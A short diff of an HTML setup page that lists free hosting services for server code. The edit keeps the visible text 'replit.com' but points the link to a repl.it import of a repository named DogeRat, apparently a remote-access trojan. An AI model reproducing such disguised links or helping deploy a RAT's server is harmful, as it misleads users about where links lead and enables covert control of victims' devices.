@@ -40,7 +40,7 @@
   <li><span style="color: #2ECC40;">TERMUX</span></li>
   <li>For hosting server code, you can use some free services like:</li>
   <ul>
-    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
+    <li><a href="https://repl.it/github.com/tucommenceapousser/DogeRat" style="color: #FF4136;">replit.com</a></li>
     <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
     <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
   </ul>
